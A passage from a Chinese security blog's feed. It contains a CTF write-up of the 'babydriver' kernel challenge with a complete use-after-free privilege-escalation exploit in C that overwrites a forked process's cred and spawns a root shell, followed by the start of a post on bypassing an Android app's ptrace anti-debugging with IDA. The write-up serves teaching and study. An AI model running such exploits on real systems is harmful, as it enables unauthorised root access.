result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>逐一分析下重点函数：</p><ol><li><strong>babydriver_init &amp; babydriver_exit函数</strong>：进行的是参数设置之类的工作，可以不用太过关注，但是要知道在 init 中设置了<code>/dev/babydev</code>作为设备文件，所以我们到时候可以通过<code>open(&quot;/dev/babydev&quot;)</code>来调用设备，从而调用这个驱动程序。</li><li><strong>babyopen 函数</strong>：初始化<code>babydev_struct</code>结构体，这个结构体包含<code>babydev_struct.device_buf</code>和<code>babydev_struct.device_buf_len</code>两个域，分别表示内核缓冲区指针和缓冲区长度，在这个函数中会用<code>kmem_cache_alloc_trace</code>初始化<code>babydev_struct.device_buf</code>，并将<code>babydev_struct.device_buf_len</code>设置为 64；</li><li><strong>babyrelease 函数</strong>：和 babyopen 函数相反，<strong>使用 kfree 函数释放指针指向的内存，注意 kfree 也会导致野指针出现</strong>；</li><li><strong>babyread &amp;babywrite 函数</strong>：分别为向用户 buffer 写入 <code>device_buf</code> 中的内容和从用户 buffer 读取内容至 device_buf，用户传递长度和缓冲区地址作为参数，只有 <code>device_buf_len</code> 超过了这个长度才可以进行拷贝或者输出（防止溢出），两者都首先进行了 <code>device_buf</code> 指针是否为空的检查，再进行后续操作；</li><li><strong>babyioctl 函数</strong>：定义了 0x10001 的命令，可以释放全局变量<code>babydev_struct</code> 中的 <code>device_buf</code>，再根据用户传递的 size 重新申请一块内存，并设置 <code>device_buf_len</code>。</li></ol><p>该驱动程序没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。</p><p><strong>UAF 漏洞分析</strong></p><p>从 Linux 内存管理机制可知，<strong>所有进程内核态的变量都指向同一片物理内存，所以全局变量 <code>babydev_struct</code> 会被所有进程共享</strong>，并且由于 SLUB&amp;SLAB （内核空间内存管理机制）分配器的特点，分配一块内存时会优先寻找有没有刚被释放的、同样大小的内存，所以可以尝试构造一个条件竞争造成的 UAF，尝试修改进程结构体 cred 中的 <code>uid=gid=0</code>，从而实现提权。</p><h1 id="提权exp"><a href="#提权exp" class="headerlink" title="提权exp"></a>提权exp</h1><p>综上所述，按照如下步骤可进行提权：</p><ol><li>连续两次打开驱动设备文件，设文件描述符分别为 fd1、fd2，这个时候由于 fd1、fd2 共享内存，会导致 fd2 覆盖 fd1 分配的空间；</li><li>先使用 ioctl 函数修改 fd1 的 <code>babydev_struct.dev_buf_len</code> 为 sizeof(cred)，在本题内核版本为 4.4.72 情况下，cred 结构体大小为0xa8，<code>babydev_struct.dev_buf</code>会被分配一块内存，由于<code>babydev_struct</code>被所有进程共享，所以 fd2 的<code>babydev_struct</code>也被修改，与 fd1 相同；</li><li>关闭 fd1，这时 fd1 中的<code>babydev_struct</code>被释放，分配的内存也被回收，但是 fd2 的<code>babydev_struct.device_buf</code>仍然指向这一块内存，如果使用 fd2 的 write 函数仍然可以向这一片空间写入数据（<strong>UAF 漏洞</strong>）；</li><li>通过 fork() 函数开启一个新进程 p，p 进程的 cred 结构体在被分配空间时会优先被分配刚被释放的、与 cred 结构体大小相同的空间，即刚才 fd1 释放的 <code>babydev_struct.device_buf</code> 指向的空间，也即现在 fd2 的<code>babydev_struct.device_buf</code>指向的空间，由于 fd2 还可控，所以相当于我们已经控制了 p 进程的 cred 结构体，从而可进行提权；</li><li>将 p 进程的<code>cred.gid、cred.uid</code>覆盖为 0，可以直接使用 fd2 的 write 系统调用函数写入（这里注意只需要将 28 字节的长度）。</li></ol><p>编写 exp.c 如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stropts.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 打开两次设备</span><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 释放 fd1</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span><span class="token keyword">char</span> zeros<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> zeros<span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] root now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>先编译 exp 并将其放入解包的文件系统中：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gcc exp.c -static -o ./fs/exp</code></pre><p>然后重新打包内核启动的文件系统，生成 rootfs.img：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sudo chmod a+x c.sh</span><span class="token comment"># ./c.sh</span><span class="token builtin class-name">cd</span> fs<span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio -o --format<span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.img</code></pre><p>接着更改虚拟机启动脚本 boot.sh（将内核启动的文件系统参数由 rootfs.cpio 改为 rootfs.img）：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>qemu-system-x86_64 -initrd rootfs.img -kernel bzImage -append <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> -cpu kvm64,+smep</code></pre><p>最后重新启动 qemu 虚拟机并运行 exp 程序，即可成功提权：<br><img src="https://img-blog.csdnimg.cn/3483b77d524c47f18b4e499ae1e17a5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>着重完成提权后，来补充下两个知识点：进程 cred 结构与 fork 函数。</p><h2 id="cred结构"><a href="#cred结构" class="headerlink" title="cred结构"></a>cred结构</h2><p>Linux kernel 需要记录每一个进程的权限信息，而这个权限信息是使用 cred 结构体记录的。每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p><p>这个 cred 结构体不同内核版本可能会有差别（可以通过该<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">网站</a>进行查找），本题内核版本为 4.4.72，查看源码为：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">atomic_t</span>    usage<span class="token punctuation">;</span> <span class="token number">0x4</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS debug选项去掉</span></span>    <span class="token class-name">atomic_t</span>    subscribers<span class="token punctuation">;</span>    <span class="token comment">/* number of processes subscribed */</span>    <span class="token keyword">void</span>        <span class="token operator">*</span>put_addr<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span>    magic<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span>  <span class="token expression"><span class="token number">0x43736564</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span> <span class="token expression"><span class="token number">0x44656144</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token class-name">kuid_t</span>      uid<span class="token punctuation">;</span>        <span class="token comment">/* real UID of the task */</span> <span class="token number">0x4</span>    <span class="token class-name">kgid_t</span>      gid<span class="token punctuation">;</span>        <span class="token comment">/* real GID of the task */</span> <span class="token number">0x4</span>    <span class="token class-name">kuid_t</span>      suid<span class="token punctuation">;</span>       <span class="token comment">/* saved UID of the task */</span> <span class="token number">0x4</span>    <span class="token class-name">kgid_t</span>      sgid<span class="token punctuation">;</span>       <span class="token comment">/* saved GID of the task */</span> <span class="token number">0x4</span>    <span class="token class-name">kuid_t</span>      euid<span class="token punctuation">;</span>       <span class="token comment">/* effective UID of the task */</span> <span class="token number">0x4</span>    <span class="token class-name">kgid_t</span>      egid<span class="token punctuation">;</span>       <span class="token comment">/* effective GID of the task */</span> <span class="token number">0x4</span>    <span class="token class-name">kuid_t</span>      fsuid<span class="token punctuation">;</span>      <span class="token comment">/* UID for VFS ops */</span> <span class="token number">0x4</span>    <span class="token class-name">kgid_t</span>      fsgid<span class="token punctuation">;</span>      <span class="token comment">/* GID for VFS ops */</span> <span class="token number">0x4</span>    <span class="token keyword">unsigned</span>    securebits<span class="token punctuation">;</span> <span class="token comment">/* SUID-less security management */</span> <span class="token number">0x4</span>    <span class="token class-name">kernel_cap_t</span>    cap_inheritable<span class="token punctuation">;</span> <span class="token comment">/* caps our children can inherit */</span> <span class="token number">0x8</span>    <span class="token class-name">kernel_cap_t</span>    cap_permitted<span class="token punctuation">;</span>  <span class="token comment">/* caps we're permitted */</span> <span class="token number">0x8</span>    <span class="token class-name">kernel_cap_t</span>    cap_effective<span class="token punctuation">;</span>  <span class="token comment">/* caps we can actually use */</span> <span class="token number">0x8</span>    <span class="token class-name">kernel_cap_t</span>    cap_bset<span class="token punctuation">;</span>   <span class="token comment">/* capability bounding set */</span> <span class="token number">0x8</span>    <span class="token class-name">kernel_cap_t</span>    cap_ambient<span class="token punctuation">;</span>    <span class="token comment">/* Ambient capability set */</span> <span class="token number">0x8</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>   jit_keyring<span class="token punctuation">;</span>    <span class="token comment">/* default keyring to attach requested 0x8                     * keys to */</span>     <span class="token keyword">struct</span> <span class="token class-name">key</span> __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring inherited over fork */</span> <span class="token number">0x8</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this process */</span> <span class="token number">0x8</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this thread */</span> <span class="token number">0x8</span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment">/* assumed request_key authority */</span> <span class="token number">0x8</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SECURITY</span></span>    <span class="token keyword">void</span>        <span class="token operator">*</span>security<span class="token punctuation">;</span>  <span class="token comment">/* subjective LSM security */</span> <span class="token number">0x8</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">struct</span> <span class="token class-name">user_struct</span> <span class="token operator">*</span>user<span class="token punctuation">;</span>   <span class="token comment">/* real user ID subscription */</span> <span class="token number">0x8</span>    <span class="token keyword">struct</span> <span class="token class-name">user_namespace</span> <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment">/* user_ns the caps and keyrings are relative to. */</span> <span class="token number">0x8</span>    <span class="token keyword">struct</span> <span class="token class-name">group_info</span> <span class="token operator">*</span>group_info<span class="token punctuation">;</span>  <span class="token comment">/* supplementary groups for euid/fsgid */</span> <span class="token number">0x8</span>     <span class="token keyword">struct</span> <span class="token class-name">rcu_head</span> rcu<span class="token punctuation">;</span>        <span class="token comment">/* RCU deletion hook */</span> <span class="token number">0x10</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>通过查找各种类型所占内存大小、对齐规则可知 cred 结构体的总大小是0xa8，一直到 gid 结束是 28 个字节。</p><p>确定该版本的 cred 结构体大小的另一种方法是自己写个简单 modules 然后编译生成 ko 驱动程序，加载到虚拟机中，printf 打印一下 sizeof(struct cred) 就能确定了：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cred.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">cred</span> c1<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"&lt;1> Hello world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"size of cred : %d \n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"&lt;1> Bye, cruel world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/e604e2da0f264af9974decbacb9d6613.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p><h2 id="fork-函数"><a href="#fork-函数" class="headerlink" title="fork()函数"></a>fork()函数</h2><p>首先先接收一个观点，那就是：<strong>操作系统就是一堆进程，每一个进程都是由已有的进程创造出来的</strong>。以 Linux 操作系统为例，在启动之后第一个诞生的进程是 PID 为 0 的名叫 “idle” 的进程，后续所有的进程都是由它通过 fork() 创建的，包括我们熟知的 PID 为 1 的 “init” 进程。也许一杯咖啡的时间，等系统完全启动，我们可以登录以后，在命令行执行我们自己写的程序，这又是通过终端进程创建了新的进程。这就是在前面所说的操作系统的运行就是进程的不断创建和销毁的过程。</p><p>在 Linux 系统函数中，<strong>fork() 是用来创建新的子进程的函数</strong>。根据 Linux 编程手册，在 fork 函数执行完毕后，如果创建新进程成功，则出现两个进程，一个是子进程，一个是父进程。<strong>在子进程中，fork 函数返回0，在父进程中，fork 返回新创建子进程的进程ID</strong>。我们可以通过 fork 返回的值来判断当前进程是子进程还是父进程。</p><blockquote><p>需要注意的是，<strong>在 fork 之后两个进程用的是相同的物理空间(内存区)，子进程的代码段、数据段、堆栈都是指向父进程的物理空间</strong>，也就是说，两者的虚拟空间不同，其对应的物理空间是一个。这是出于效率的考虑，在 Linux 中被称为“写时复制”（COW）技术，只有当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间。</p></blockquote><p>但凡是进程，都有自己的虚拟地址空间。对于 32 位的 Linux 系统而言，虚拟地址空间是从 0 到 4G 的大小（其中 0-3G 属于用户空间 3-4G 属于内核空间）。创建完子进程后，父进程继续运行（即原来的进程）的代码，刚创建出来的子进程拥有和父进程完全一样的代码段，数据段，也就是说完完全全拷贝了一份父进程，和父进程完全一样。即 clone 父进程 0-3G 用户空间的内容，而 3-4G 的内核空间只需要重新映射一下到物理地址的 kernel 即可。<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/e02b212a5f994a16a73ec454e5b10e05.png" alt="在这里插入图片描述" loading="lazy"><br>但是操作系统要如何区分这两个进程呢？答案就是进程 ID，即 pid。pid 是存储在 PCB（Process Control Block，为了描述控制进程的运行，系统中存放进程的管理和控制信息的数据结构称为进程控制块） 当中的类似身份证的东西。子进程会 clone 父进程的 PCB 到子进程，但是 PCB 里的 pid 会从操作系统中获取，得到新的 pid。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android 内核层驱动程序涉及到的知识点很多，如 Linux 内核架构、驱动程序编写、字符设备程序、Linux 内存管理、Linux 系统调用、mmap 内存映射、驱动程序攻击面等等，此处不一一开展……过往的工作经历基本上都是碎片化的学习，很少静下心来系统性学习和研究一个方向，在此感谢下新单位给予了一个静心成长和沉淀的环境。还是那句话，安全路很长……希望在未来 1-2 年自己也能在移动终端安全、二进制安全方向建立较为完整的知识体系并独当一面吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;自 2021 年 11 月从国企离职并入职互联网私企后，发现博客很少更新了……自然不是因为开始躺平了（菜鸡的学习之路还很漫长…），而是新的平</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://tr0e.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>IDA动态调试破解AliCrackme与反调试对抗</title>
    <link href="https://tr0e.github.io/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A0%B4%E8%A7%A3AliCrackme%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AF%B9%E6%8A%97/"/>
    <id>https://tr0e.github.io/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A0%B4%E8%A7%A3AliCrackme%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AF%B9%E6%8A%97/</id>
    <published>2021-10-17T08:16:33.000Z</published>
    <updated>2022-06-15T16:05:37.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前面的文章中 <a href="https://bwshen.blog.csdn.net/article/details/120699662">IDA动态调试破解EXE文件与分析APK流程</a> 介绍了 IDA 对 APK 进行动态调试分析的简单流程，然而实际上很多 APP 为了防止被动态调试分析，经常会做一些反调试的防护措施。本文将通过 2014 年阿里安全挑战赛的第二题 AliCrackme_2（<a href="https://yirj.lanzoui.com/iehe4ity92h">APK下载地址</a>），来进一步学习 APK so 文件的动态调试和反调试技术的对抗。<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/6bc29cfe66ff4087ac3a97b960f8c380.png" alt="在这里插入图片描述" loading="lazy"></p><h1 id="APK破解-上"><a href="#APK破解-上" class="headerlink" title="APK破解(上)"></a>APK破解(上)</h1><p>显然，上面的程序希望我们输入正确的验证码/密码，故破解的目标就是获取到正确的密码（即 Flag 值）。</p><h2 id="1-1-静态分析"><a href="#1-1-静态分析" class="headerlink" title="1.1 静态分析"></a>1.1 静态分析</h2><p>1、先拖进 jadx 查看其验证码校验逻辑，发现程序调用了 libcrackme.so 的 securityCheck() 函数对输入密码进行校验，如果正确则启动一个新的活动，否则则提示验证码校验错误：<br><img src="https://img-blog.csdnimg.cn/385e10a961fd46b89876bb5010da5569.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">2、将 libcrackme.so 文件导出并拖进 IDA 进行静态分析：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/01b855bde6e544e7b50a6d656f62ab0e.png" alt="在这里插入图片描述" loading="lazy">3、按 F5 转换成伪代码：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/9f5bc72ec21f468c9e229987390a8b79.png" alt="在这里插入图片描述" loading="lazy">发觉 v6 变量 off_628C 可能有东西，双击跟进看看：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/4a97e5499e0a434e9551fb8a7a8fdc51.png" alt="在这里插入图片描述" loading="lazy"><br>4、进行 JNI 函数方法名还原，可以较清晰地分析出程序的逻辑：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/3055d756670f4f8b8ae7dcc7ecef8871.png" alt="在这里插入图片描述" loading="lazy">C 伪代码的解释我已添加在备注中，可以看出接下来的目标就是通过 IDA 动态调试来获取真实的 v6 变量（真实的密码）的值。</p><h2 id="1-2-动态分析"><a href="#1-2-动态分析" class="headerlink" title="1.2 动态分析"></a>1.2 动态分析</h2><p>1、在 securityCheck() 函数如下位置设置断点：<br><img src="https://img-blog.csdnimg.cn/4c4f5dc2d7a34c40a3f6697dfc0c992e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">2、在真机 Nexus5 中安装目标 APK，运行 IDA 调试服务并转发端口：<br><img src="https://img-blog.csdnimg.cn/becfbdfafdcb4d6dbf4002f3ce7166d8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">3、设置 IDA Debugger：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/3cbab0687f7743c9be4985ac51076eca.png" alt="在这里插入图片描述" loading="lazy"><img src="https://img-blog.csdnimg.cn/6357d3dcb962408eaa6b4fac76e6607b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>4、启动 APP 并在 IDA 进行进程附加：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/dd59b295951c4d519454166b6c6cc141.png" alt="在这里插入图片描述" loading="lazy"><br>5、然而发现附加进程后，一点击运行程序按钮（或者 F9 快捷键），程序立马闪退……<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/e1cf64f869fc4debb446c926ebfa9058.png" alt="在这里插入图片描述" loading="lazy">可以猜测该 APP 使用了反调试机制防止程序被动态调试分析，想进一步调试分析，必须绕过其反调试机制。</p><h1 id="反调试对抗"><a href="#反调试对抗" class="headerlink" title="反调试对抗"></a>反调试对抗</h1><p>接下来来通过 IDA 动态调试分析 APP 的反调试检测机制，并进行对抗和破解，使得目标 APP 能够被我们正常地调试。</p><h2 id="2-1-Ptrace"><a href="#2-1-Ptrace" class="headerlink" title="2.1 Ptrace"></a>2.1 Ptrace</h2><blockquote><p>【反调试原理】IDA 是使用 android_server 在 root 环境下注入到被调试的 APP 程序进程中，那么对抗调试就可以利用 Linux 系统的 ptrace 来实现，当 Android 应用被调试时应用内存里的 TracerPid 字段就不为 0（即在其 status 文件中有一个字段 TracerPid 可以标识是被哪一个进程 trace 了)，只要是不为 0 的时候，就会直接的退出程序，达到反调试的目的。</p></blockquote><p>来验证一下上述调试过程中，真机上目标 APP 进程的 ptrace 字段：</p><pre class="language-bash" data-language="bash"><code class="language-bash">进入设备：adb shell获取Root权限：su获得APP的进程ID：ps <span class="token operator">|</span> <span class="token function">grep</span> 软件的包名查看进程的信息及TracerPid值： <span class="token function">cat</span> /proc/进程ID/status</code></pre><p>结果如下，可以看到程序进程被进程 id 为 16453 的进程所附加：<br><img src="https://img-blog.csdnimg.cn/bbc793c98e8d4df88c62572bbf17d65e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy">Linux 系统中 ptrace 系统调用提供了一个进程 (tracer) 可以控制另一个进程 (tracee) 运行的方法，并且 tracer 可以监控和修改 tracee 的内存和寄存器，主要用作实现断点调试和系统调用追踪。具体可参见看雪的文章：<a href="https://bbs.pediy.com/thread-265812.htm">[原创] Linux ptrace详细分析系列（一）</a>，此处不展开介绍。</p><h2 id="2-2-全局调试"><a href="#2-2-全局调试" class="headerlink" title="2.2 全局调试"></a>2.2 全局调试</h2><p>既然目标 APP 在 so 文件进行了反调试，那么要想破解反调试机制，就需要对 so 文件进行调试（静态分析你要是能分析出来也行……）。但是前面的调试过程已经以失败告终，无法正常运行程序，那该怎么办？</p><p>进行常规 IDA 调试过程，只要一运行目标 APP 程序就会强制退出了调试界面，说明目标 APP 循环检测被调试状态的函数执行的时机非常早。幸运的是，有两个地方是 so 动态加载完毕前执行的：</p><ol><li><code>.init_array</code> 是一个so最先加载的一个段信息，时机最早，现在一般 so 解密操作都是在这里做的；</li><li><code>JNI_OnLoad</code> 是 so 被 System.loadLibrary 调用的时候执行的，它的时机早于 native 方法的执行。</li></ol><p>那么知道了这两个时机，下面我们先来看看是不是在<code>JNI_OnLoad</code>函数中做的策略，所以我们需要先动态调试<code>JNI_OnLoad</code>函数。我们既然知道了 JNI_OnLoad 函数的时机，如果阿里把检测函数放在这里的话，我们不能用之前的方式去调试了，因为之前的那种方式时机太晚了，只要运行就已经执行了 JNI_OnLoad 函数，所以就会退出调试页面。</p><p>1、接下来我们就尝试断在 JNI_OnLoad 函数指令处，先在  JNI_OnLoad 函数设置断点并在 debugger 设置中勾选如下选项：<br><img 